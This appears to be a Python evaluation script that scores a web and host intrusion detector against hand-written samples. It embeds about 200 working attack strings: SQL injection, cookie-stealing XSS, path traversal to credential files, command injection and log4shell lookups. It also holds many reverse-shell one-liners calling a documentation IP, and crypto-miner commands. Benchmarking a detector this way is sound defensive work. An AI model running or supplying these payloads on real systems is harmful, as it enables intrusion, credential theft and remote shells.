#!/usr/bin/env python3
"""ROUND 2 held-out evaluation.   python3 eval/heldout_round2.py   ->  eval/results/ROUND2_RESULTS.md + round2.csv

WHY: the first benchmark (eval_new_attacks.py) has few held-out samples (4-10 per class). This one has 50+ per web class and more host samples, written
AFTER the rules were frozen. The rules are NOT changed by this script: every number is the detector as it is, every miss is printed.
HONEST LIMIT: these samples were written by the same author as the rules, so they are not independent. For an independent number, a teammate who has NOT
read detector/web_guard.py puts their own samples in eval/samples_teammate/*.txt (see README_TEAMMATE.md there) and runs this script again: those rows
are reported separately as 'teammate'. If rules are changed after seeing misses, say so: those samples are then development samples, no longer held-out.
"""
import csv, os, sys, tempfile, time
HERE = os.path.dirname(os.path.abspath(__file__)); ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "detector"))
import web_guard as wg, host_guard as hg
OUT = os.path.join(HERE, "results"); os.makedirs(OUT, exist_ok=True); TM = os.path.join(HERE, sys.argv[1] if len(sys.argv) > 1 else "samples_teammate"); TAG = sys.argv[2] if len(sys.argv) > 2 else "teammate"

def line(ip, url, st=200, ua="Mozilla/5.0 (X11; Linux x86_64)"):
    return '%s - - [22/Nov/2026:10:00:00 +0000] "GET %s HTTP/1.1" %d 512 "-" "%s"' % (ip, url.replace(" ", "%20"), st, ua)
def pts(url, st=200):
    c = wg.classify(line("203.0.113.9", url, st)); return sum(p for _, p in c[3]) if c else 0

WEB = {
 "SQL injection": """/a?id=1' AND '1'='1
/a?id=1 ORDER BY 10--
/a?id=1 ORDER BY 3#
/a?id=-1' UNION SELECT NULL,NULL,NULL--
/a?id=1 UNION SELECT @@version
/a?id=1 UNION SELECT group_concat(table_name) FROM information_schema.tables
/a?id=1; EXEC xp_cmdshell('whoami')--
/a?id=1; EXEC master..xp_cmdshell 'dir'
/a?id=1' AND (SELECT COUNT(*) FROM users)>0--
/a?id=1 AND IF(1=1,SLEEP(3),0)
/a?id=1' AND SLEEP(3)#
/a?id=1;SELECT PG_SLEEP(3)--
/a?id=1' AND 1=CAST((SELECT version()) AS INT)--
/a?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)
/a?id=1' OR 1=1#
/a?id=1' OR 1=1/*
/a?user=admin'/*
/a?user=' OR ''='
/a?user=' or 1=1 limit 1--
/a?id=1 OR 2>1
/a?id=1' UNION ALL SELECT username,password FROM accounts--
/a?id=1 UNION%20SELECT%20null,null
/a?id=1%20AND%201=1--
/a?id=1+UNION+SELECT+1,load_file('/etc/passwd')
/a?id=1 INTO OUTFILE '/var/www/x.php'
/a?id=1;INSERT INTO users VALUES('a','b')--
/a?id=1;UPDATE users SET admin=1--
/a?id=1;DELETE FROM logs--
/a?id=1;TRUNCATE TABLE sessions
/a?id=1 AND ASCII(SUBSTR((SELECT pass FROM u LIMIT 1),1,1))=97
/a?id=1 AND 'x'='x
/a?id=1 AND 5=5
/a?id=1' AND 7=7--
/a?id=1 HAVING 1=1--
/a?id=1 GROUP BY name HAVING 1=1
/a?id=1 PROCEDURE ANALYSE()
/a?id=1 AND (SELECT * FROM (SELECT(SLEEP(2)))a)
/a?id=1 RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))
/a?id=1 AND EXISTS(SELECT * FROM users)
/a?id=1 UnIoN/**/AlL/**/SeLeCt 1,2
/a?id=%31%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%201
/a?id=1%27%20oR%20%271%27%3D%271
/a?q=x%27%3B%20DROP%20TABLE%20users%3B--
/a?id=1' WAITFOR DELAY '0:0:3'--
/a?id=1; WAITFOR DELAY '0:0:3'
/a?id=1 AND benchmark(5000000,sha1(1))
/a?id=1 AND LENGTH(database())>0
/a?id=1 UNION SELECT schema_name FROM information_schema.schemata
/a?id=1 AND (SELECT 1 FROM dual WHERE 1=1)
/a?id=1 OR '1'='1'--""".split("\n"),
 "XSS": """/c?m=<script>document.location='http://evil/?c='+document.cookie</script>
/c?m=<script>fetch('//evil/'+document.cookie)</script>
/c?m=<img src=x onerror=alert(document.domain)>
/c?m=<img/src=x/onerror=alert(1)>
/c?m=<svg/onload=alert(1)>
/c?m=<svg><script>alert(1)</script></svg>
/c?m=<body onload=alert(1)>
/c?m=<input autofocus onfocus=alert(1)>
/c?m=<select autofocus onfocus=alert(1)>
/c?m=<textarea autofocus onfocus=alert(1)>
/c?m=<video><source onerror=alert(1)>
/c?m=<audio src=x onerror=alert(1)>
/c?m=<marquee onstart=alert(1)>
/c?m=<iframe src=javascript:alert(1)>
/c?m=<iframe srcdoc='<script>alert(1)</script>'>
/c?m=<object data=javascript:alert(1)>
/c?m=<embed src=javascript:alert(1)>
/c?m=<a href="javascript:alert(1)">click</a>
/c?m=<a href=jAvAsCrIpT:alert(1)>x</a>
/c?m=<form action=javascript:alert(1)><input type=submit>
/c?m=<button formaction=javascript:alert(1)>x</button>
/c?m="><script>alert(1)</script>
/c?m='><script>alert(1)</script>
/c?m="onmouseover="alert(1)
/c?m=' onmouseover='alert(1)
/c?m=<div onmouseover=alert(1)>x</div>
/c?m=<p onclick=alert(1)>x</p>
/c?m=%3Cscript%3Ealert(1)%3C%2Fscript%3E
/c?m=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
/c?m=%3Csvg%20onload%3Dalert(1)%3E
/c?m=%253Cscript%253Ealert(1)%253C%252Fscript%253E
/c?m=<ScRiPt>alert(1)</ScRiPt>
/c?m=<scr<script>ipt>alert(1)</scr</script>ipt>
/c?m=<script>eval(atob('YWxlcnQoMSk='))</script>
/c?m=<script>alert(String.fromCharCode(88,83,83))</script>
/c?m=<script src=https://evil.example/x.js></script>
/c?m=<link rel=stylesheet href=javascript:alert(1)>
/c?m=<meta http-equiv=refresh content="0;url=javascript:alert(1)">
/c?m=<base href=javascript:alert(1)//>
/c?m=<details open ontoggle=alert(1)>
/c?m=<math><mtext><script>alert(1)</script>
/c?m=<img src=x onerror=eval(location.hash.slice(1))>
/c?m=<img src="x" onerror="this.src='//evil/?'+document.cookie">
/c?m=<style>@import 'javascript:alert(1)';</style>
/c?m=<xss onafterscriptexecute=alert(1)>
/c?m=<svg><animate onbegin=alert(1) attributeName=x dur=1s>
/c?m=<img src=x onload=alert(1)>
/c?m=<body onpageshow=alert(1)>
/c?m=javascript:alert(document.cookie)
/c?m=<IMG SRC=javascript:alert('XSS')>""".split("\n"),
 "Path traversal": """/f?p=../../../etc/passwd
/f?p=../../../../../../etc/passwd
/f?p=..%2f..%2f..%2fetc%2fpasswd
/f?p=%2e%2e/%2e%2e/etc/passwd
/f?p=%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
/f?p=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
/f?p=....//....//....//etc/passwd
/f?p=..;/..;/etc/passwd
/f?p=%252e%252e%252f%252e%252e%252fetc%252fpasswd
/f?p=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
/f?p=/etc/passwd
/f?p=/etc/shadow
/f?p=/etc/hosts
/f?p=/etc/group
/f?p=/etc/issue
/f?p=/proc/self/environ
/f?p=/proc/version
/f?p=/proc/self/cmdline
/f?p=/var/log/auth.log
/f?p=/var/log/apache2/access.log
/f?p=/root/.ssh/id_rsa
/f?p=/home/user/.bash_history
/f?p=C:\\Windows\\win.ini
/f?p=C:/boot.ini
/f?p=../../../../windows/win.ini
/f?p=../../../../etc/mysql/my.cnf
/f?p=../../../../etc/nginx/nginx.conf
/f?p=../../../../var/www/html/config.php
/f?p=../../../../../../../../etc/passwd%00
/f?p=../../../etc/passwd%00.jpg
/f?p=....\\\\....\\\\etc\\\\passwd
/img/..%2f..%2f..%2fetc/passwd
/static/../../../../etc/passwd
/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/download/..%5c..%5c..%5cwindows/win.ini
/a/b/../../../../../../etc/passwd
/a?file=file:///etc/passwd
/a?file=php://filter/convert.base64-encode/resource=index.php
/a?file=expect://id
/a?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
/a?page=....//....//....//....//etc/passwd
/a?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/a?page=..%252f..%252f..%252fetc%252fpasswd
/a?page=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
/a?page=%uff0e%uff0e/%uff0e%uff0e/etc/passwd
/a?tpl=../../../../../../etc/passwd
/a?tpl=/etc/passwd
/a?doc=../../../../proc/self/environ
/a?doc=..%2f..%2f..%2f..%2fproc%2fself%2fenviron
/a?inc=../../../../etc/passwd""".split("\n"),
 "Command injection / log4shell": """/r?c=ls;id
/r?c=a;id
/r?c=a&&id
/r?c=a||id
/r?c=a|id
/r?c=a`id`
/r?c=a$(id)
/r?c=a;cat /etc/passwd
/r?c=a;cat%20/etc/passwd
/r?c=a|cat /etc/passwd
/r?c=a%0aid
/r?c=a%0a/bin/cat /etc/passwd
/r?c=a;nc -e /bin/sh 10.0.0.1 4444
/r?c=a;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
/r?c=a;/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
/r?c=a;python -c 'import os;os.system("id")'
/r?c=a;perl -e 'exec "/bin/sh"'
/r?c=a;php -r 'system("id");'
/r?c=a;wget http://evil/x.sh -O- | sh
/r?c=a;curl http://evil/x.sh | bash
/r?c=a;curl -o /tmp/x http://evil/x;chmod +x /tmp/x;/tmp/x
/r?c=a;rm -rf /
/r?c=a;chmod 777 /tmp/x
/r?c=a;uname -a
/r?c=a;whoami
/r?c=a;powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil/x')
/r?c=a&cmd.exe /c dir
/r?c=a|cmd /c whoami
/r?c=${jndi:ldap://evil.example/a}
/r?c=${jndi:rmi://evil.example/a}
/r?c=${jndi:dns://evil.example/a}
/r?c=${${::-j}${::-n}${::-d}${::-i}:ldap://evil/a}
/r?c=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil/a}
/r?c=${j${::-n}di:ldap://evil/a}
/r?c=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D
/r?c=${jndi:ldap://${env:USER}.evil/a}
/r?c=${env:AWS_SECRET_ACCESS_KEY}
/r?c=%{(#_='multipart/form-data').(#cmd='id')}
/r?c=${7*7}${jndi:ldap://x/y}
/r?c=a;sleep 5
/r?c=a|sleep 5
/r?c=a`sleep 5`
/r?c=$(sleep 5)
/r?c=a;ping -c 5 127.0.0.1
/r?c=a&ping -n 5 127.0.0.1
/r?c=;/usr/bin/id
/r?c=;/bin/ls -la
/r?c=a;echo vulnerable
/r?c=a|echo vulnerable
/r?c=%3Bid
/r?c=%7Cid""".split("\n"),
}
BENIGN_WEB = """/
/index.html
/about
/contact?name=Rahul+Sharma&msg=Hello+there
/search?q=best+laptops+under+50000
/search?q=how+to+join+two+tables+in+sql
/search?q=difference+between+union+and+join
/search?q=select+a+gift+for+mom
/search?q=drop+shipping+business
/search?q=what+is+sql+injection
/search?q=nodejs+tutorial
/search?q=%E0%A4%AD%E0%A4%BE%E0%A4%B0%E0%A4%A4+%E0%A4%95%E0%A4%BE+%E0%A4%87%E0%A4%A4%E0%A4%BF%E0%A4%B9%E0%A4%BE%E0%A4%B8
/blog/2026/11/how-we-built-our-site
/blog/or-and-not-logic-gates
/blog/script-writing-tips
/blog/how-to-delete-a-file-in-linux
/blog/cross-site-scripting-explained
/products?category=shoes&brand=nike&page=2&sort=price_asc
/products/12345
/products?min=100&max=500
/cart?item=55&qty=2
/checkout?step=2
/user/profile?id=42
/user/settings
/api/v1/items?limit=20&offset=40
/api/v1/items/99/comments
/api/health
/static/css/main.css
/static/js/app.3f9a1b.js
/static/img/logo.png
/static/fonts/inter.woff2
/images/photo_2026-11-01.jpg
/downloads/report-2026.pdf
/downloads/setup_v1.2.3.exe
/docs/getting-started
/docs/api/reference#section-2
/docs/union-types
/news/2026/election-results
/news?id=1234
/feed.xml
/sitemap.xml
/robots.txt
/favicon.ico
/login
/login?next=/dashboard
/logout
/register
/forgot-password
/events?date=2026-11-22
/events?from=2026-11-01&to=2026-11-30
/map?lat=28.6139&lng=77.2090&zoom=12
/calc?expr=2%2B2
/calc?a=5&b=10&op=add
/price?from=100&to=200
/tag/c++
/tag/c%23
/q?name=D%27Souza
/q?name=O%27Brien
/q?title=Tom+%26+Jerry
/q?email=user%40example.com
/q?url=https%3A%2F%2Fexample.org%2Fpage
/q?redirect=%2Fhome
/q?ref=a-b_c.d
/q?text=100%25+cotton
/q?x=1&y=2&z=3
/files/archive.tar.gz
/files/notes..txt
/files/v1.0..v1.1.patch
/wiki/SQL
/wiki/Cross-site_scripting
/wiki/Path_(computing)
/shop/select-your-size
/shop/drop-in-center
/team/union-station
/support/ticket?id=7&status=open
/forum/thread/881?page=3
/forum/post?title=Help+with+my+script
/forum/post?body=I+used+a+for+loop+and+it+worked
/gallery?album=holiday&photo=17
/profile/john.doe
/u/someone_1990""".split("\n")
BEN_ERR = [("/missing-page", 404), ("/old/link.html", 404), ("/wp-login.php", 200), ("/admin/", 403), ("/favicon.png", 404)]

SH_SOCK = {True: "with a remote connection", False: "without"}
def fake_proc(cmds, sockets=None):
    R = tempfile.mkdtemp(); proc = os.path.join(R, "proc"); os.makedirs(proc + "/net"); tcp = ["  sl local rem st x x x x x x inode"]
    for i, (cmd, exe) in enumerate(cmds):
        pid = 1000 + i; d = "%s/%d" % (proc, pid); os.makedirs(d + "/fd")
        open(d + "/cmdline", "w").write("\0".join(cmd.split(" ")) + "\0"); open(d + "/stat", "w").write("%d (x) S 1 1 1" % pid); os.symlink(exe, d + "/exe")
        if sockets and sockets.get(i):
            os.symlink("socket:[%d]" % (5000 + i), d + "/fd/3"); tcp.append("   %d: 0100007F:1234 076433C6:115C 01 0 0 0 0 0 %d" % (i, 5000 + i))
    open(proc + "/net/tcp", "w").write("\n".join(tcp) + "\n"); return proc
def run_host(cmds, sockets=None):
    proc = fake_proc(cmds, sockets)
    g = hg.HostGuard(lambda p: None, lambda e, r: None, lambda ip: None, lambda ip: None, lambda ip: None, proc=proc, me=1, log=lambda m: None)
    return {f["pid"] - 1000 for f in g.scan() if f["level"] == "HIGH"}
S = "198.51.100.7"
SHELLS = [("bash -i >& /dev/tcp/%s/4444 0>&1" % S, "/usr/bin/bash"), ("bash -c exec 5<>/dev/tcp/%s/80;cat <&5|while read l;do $l 2>&5 >&5;done" % S, "/usr/bin/bash"),
 ("sh -c sh -i >& /dev/tcp/%s/9001 0>&1" % S, "/usr/bin/sh"), ("/bin/sh -i" , "/usr/bin/sh"), ("dash -i", "/usr/bin/dash"), ("nc %s 4444 -e /bin/bash" % S, "/usr/bin/nc"),
 ("nc.traditional -e /bin/sh %s 4444" % S, "/usr/bin/nc.traditional"), ("ncat %s 4444 -e /bin/sh" % S, "/usr/bin/ncat"), ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s 4444 >/tmp/f" % S, "/usr/bin/bash"),
 ("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:4444" % S, "/usr/bin/socat"), ("socat TCP4:%s:4444 EXEC:/bin/bash" % S, "/usr/bin/socat"),
 ("python3 -c import socket,os,pty;s=socket.socket();s.connect(('%s',4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/sh')" % S, "/usr/bin/python3"),
 ("python -c import socket,subprocess;s=socket.socket();s.connect(('%s',4444));subprocess.call(['/bin/sh','-i'],stdin=s,stdout=s,stderr=s)" % S, "/usr/bin/python2"),
 ("perl -e use Socket;$i='%s';socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));connect(S,sockaddr_in(4444,inet_aton($i)));exec('/bin/sh -i');" % S, "/usr/bin/perl"),
 ("ruby -rsocket -e exit if fork;c=TCPSocket.new('%s','4444');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end" % S, "/usr/bin/ruby"),
 ("php -r $sock=fsockopen('%s',4444);exec('/bin/sh -i <&3 >&3 2>&3');" % S, "/usr/bin/php"),
 ("php -r $s=fsockopen('%s',4444);shell_exec('/bin/sh -i <&3 >&3 2>&3');" % S, "/usr/bin/php7.4"),
 ("node -e (function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(4444,'%s',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);});})();" % S, "/usr/bin/node"),
 ("lua -e require('socket');t=socket.tcp();t:connect('%s','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');" % S, "/usr/bin/lua"),
 ("openssl s_client -quiet -connect %s:4444 | /bin/sh 2>&1 | openssl s_client -quiet -connect %s:4445" % (S, S), "/usr/bin/openssl"),
 ("telnet %s 4444 | /bin/bash | telnet %s 4445" % (S, S), "/usr/bin/telnet"), ("busybox nc %s 4444 -e /bin/sh" % S, "/bin/busybox"),
 ("awk BEGIN{s=\"/inet/tcp/0/%s/4444\";while(42){do{printf\"shell>\"|&s;s|&getline c;if(c){while((c|&getline)>0)print|&s;close(c)}}while(c!=\"exit\")}}" % S, "/usr/bin/gawk"),
 ("zsh -c zmodload zsh/net/tcp;ztcp %s 4444;zsh >&$REPLY 2>&$REPLY 0<&$REPLY" % S, "/usr/bin/zsh"), ("ksh -c ksh -i > /dev/tcp/%s/4444 2>&1 <&1" % S, "/usr/bin/ksh"),
 ("curl http://%s/s.sh | bash" % S, "/usr/bin/bash")]
MINERS = [("xmrig", "/tmp/xmrig"), ("./xmrig -o pool.minexmr.com:4444 -u 48abc", "/tmp/xmrig"), ("./xmr-stak --url pool:3333", "/tmp/xmr-stak"), ("./minerd -a cryptonight -o stratum+tcp://p:3333", "/tmp/minerd"),
 ("./cpuminer --algo=yespower -o stratum+tcp://x:1", "/tmp/cpuminer"), ("./ethminer -P stratum1+tcp://0xabc@eu1.ethermine.org:4444", "/tmp/ethminer"), ("./t-rex -a ethash -o stratum+tcp://x:1 -u w", "/tmp/t-rex"),
 ("./nbminer -a eth -o stratum+tcp://x:1 -u w", "/tmp/nbminer"), ("./lolMiner --algo ETHASH --pool x:1", "/tmp/lolMiner"), ("./phoenixminer -pool x:1 -wal w", "/tmp/phoenixminer"),
 ("./kdevtmpfsi", "/tmp/kdevtmpfsi"), ("./kinsing", "/var/tmp/kinsing"), ("./watchdogs -o stratum+tcp://x:1", "/tmp/watchdogs"), ("./systemd-update -o pool.supportxmr.com:443 -u 49x", "/dev/shm/systemd-update"),
 ("./.hidden/crond --donate-level=1 -o x:1", "/home/u/.hidden/crond"), ("java -jar m.jar -o stratum+tcp://x:1 -u w", "/usr/bin/java")]
BEN_HOST = [("vim xmrig.conf", "/usr/bin/vim"), ("less /var/log/minerd.log", "/usr/bin/less"), ("grep -r stratum /var/log", "/usr/bin/grep"), ("man nc", "/usr/bin/man"), ("cat /etc/hosts", "/usr/bin/cat"),
 ("bash", "/usr/bin/bash"), ("bash -l", "/usr/bin/bash"), ("zsh", "/usr/bin/zsh"), ("sudo apt update", "/usr/bin/sudo"), ("apt install netcat", "/usr/bin/apt"), ("curl -O https://example.org/a.tar.gz", "/usr/bin/curl"),
 ("wget https://github.com/xmrig/xmrig/releases/download/v6/xmrig.tar.gz", "/usr/bin/wget"), ("git clone https://github.com/xmrig/xmrig", "/usr/bin/git"), ("ssh user@host", "/usr/bin/ssh"), ("ssh -t host bash", "/usr/bin/ssh"),
 ("scp a.txt host:/tmp", "/usr/bin/scp"), ("python3 manage.py runserver", "/usr/bin/python3"), ("python3 -m http.server 8000", "/usr/bin/python3"), ("node server.js", "/usr/bin/node"), ("npm install", "/usr/bin/npm"),
 ("java -jar app.jar --server.port=8080", "/usr/bin/java"), ("php artisan migrate", "/usr/bin/php"), ("ruby app.rb", "/usr/bin/ruby"), ("perl script.pl", "/usr/bin/perl"), ("nc -zv host 22", "/usr/bin/nc"),
 ("ncat -l 8080", "/usr/bin/ncat"), ("socat -u FILE:a.txt TCP:host:9", "/usr/bin/socat"), ("openssl x509 -in c.pem -text", "/usr/bin/openssl"), ("openssl s_client -connect example.org:443", "/usr/bin/openssl"),
 ("telnet localhost 25", "/usr/bin/telnet"), ("docker run -it ubuntu bash", "/usr/bin/docker"), ("docker exec -it web sh", "/usr/bin/docker"), ("kubectl exec -it pod -- bash", "/usr/bin/kubectl"),
 ("make -j4", "/usr/bin/make"), ("gcc -o a a.c", "/usr/bin/gcc"), ("top", "/usr/bin/top"), ("htop", "/usr/bin/htop"), ("tmux", "/usr/bin/tmux"), ("screen", "/usr/bin/screen"), ("rsync -av a/ b/", "/usr/bin/rsync")]

def tm(name):
    p = os.path.join(TM, name)
    return [l.rstrip("\n") for l in open(p, errors="replace") if l.strip() and not l.startswith("#")] if os.path.exists(p) else []
rows, misses = [], []
def web_class(tag, cls, urls):
    fl = blk = 0
    for u in urls:
        p = pts(u)
        if p >= 1: fl += 1
        else: misses.append("%s web %s not flagged: %s" % (tag, cls, u))
        if p >= 10: blk += 1
    rows.append((tag, "web", cls, len(urls), fl, "%d would block on that single request" % blk))
def benign_web(tag, urls):
    fl = blk = 0
    for u in urls:
        p = pts(u)
        if p >= 1: fl += 1; misses.append("%s web BENIGN flagged (%d points): %s" % (tag, p, u))
        if p >= 10: blk += 1
    rows.append((tag, "web", "BENIGN requests", len(urls), fl, "%d would BLOCK a visitor on one request (must be 0)" % blk))
for cls, urls in WEB.items(): web_class("dev-2", cls, urls)
benign_web("dev-2", BENIGN_WEB)
fp = 0
for u, st in BEN_ERR:
    if pts(u, st) >= 10: fp += 1; misses.append("dev-2 web BENIGN error-page request scored >=10: %s %d" % (u, st))
rows.append(("dev-2", "web", "BENIGN 404/403 and admin-login pages", len(BEN_ERR), fp, "scored 10+ points (must be 0)"))
f = run_host(SHELLS, {i: True for i in range(len(SHELLS))})
for i in range(len(SHELLS)):
    if i not in f: misses.append("dev-2 host reverse shell not caught: " + SHELLS[i][0][:100])
rows.append(("dev-2", "host", "Reverse shells (%s)" % SH_SOCK[True], len(SHELLS), len(f), "killed"))
f = run_host(MINERS)
for i in range(len(MINERS)):
    if i not in f: misses.append("dev-2 host miner not caught: " + MINERS[i][0][:100])
rows.append(("dev-2", "host", "Crypto miners", len(MINERS), len(f), "killed"))
f = run_host(BEN_HOST)
for i in f: misses.append("dev-2 host BENIGN killed: " + BEN_HOST[i][0])
rows.append(("dev-2", "host", "BENIGN processes", len(BEN_HOST), len(f), "wrongly killed (must be 0)"))
# teammate samples (independent): one per line; shell.txt / miner.txt / benign_host.txt use  command<TAB>exe
for cls, fn in (("SQL injection", "sqli.txt"), ("XSS", "xss.txt"), ("Path traversal", "traversal.txt"), ("Command injection / log4shell", "cmdinj.txt")):
    u = tm(fn)
    if u: web_class(TAG, cls, u)
u = tm("benign_web.txt")
if u: benign_web(TAG, u)
for cls, fn, sock, benign in (("Reverse shells", "shell.txt", True, False), ("Crypto miners", "miner.txt", False, False), ("BENIGN processes", "benign_host.txt", False, True)):
    L = [tuple(x.split("\t")) for x in tm(fn) if "\t" in x]
    if L:
        f = run_host(L, {i: True for i in range(len(L))} if sock else None)
        for i in range(len(L)):
            if benign and i in f: misses.append(TAG + " host BENIGN killed: " + L[i][0])
            if not benign and i not in f: misses.append(TAG + " host %s not caught: %s" % (cls, L[i][0][:100]))
        rows.append((TAG, "host", cls, len(L), len(f), "wrongly killed (must be 0)" if benign else "killed"))
def pct(a, b): return "%d (%d%%)" % (a, round(100 * a / b)) if b else "-"
with open(os.path.join(OUT, "round2.csv"), "w", newline="") as fh:
    w = csv.writer(fh); w.writerow(["set", "area", "class", "samples", "caught_or_wrong", "note"]); w.writerows(rows)
md = ["# Round 2 held-out evaluation (offline)", "", "Made by `python3 eval/heldout_round2.py` on %s. Rules were NOT changed for this run." % time.strftime("%Y-%m-%d"), "",
 "**How to read the Set column.** `dev-2` = the built-in round-2 samples: they were run once untuned (see ROUND2_BEFORE_TUNING.md: SQLi 64%, XSS 92%, traversal 78%, command injection 57%), then the rules were fixed for their misses, so they are now DEVELOPMENT samples and their numbers are optimistic. Any other set name (e.g. `round3`, `teammate`) = samples from that folder that no rule was tuned on: those are the honest numbers. Samples written by the rule author are not independent; `teammate` (written by someone who never read the rules) is the independent one. For BENIGN rows lower is better. Small hand-written sets, no network traffic.", "",
 "| Set | Area | Class | Samples | Caught / wrong | Note |", "|---|---|---|---|---|---|"]
for s, a, c, n, k, note in rows:
    benign = "BENIGN" in c
    md.append("| %s | %s | %s | %d | %s | %s |" % (s, a, c, n, str(k) if benign else pct(k, n), note))
md += ["", "## Misses and false positives (printed, not hidden)", ""] + ["- " + m for m in misses] + [""]
open(os.path.join(OUT, "ROUND2_RESULTS.md"), "w").write("\n".join(md))
print("\n".join(md))
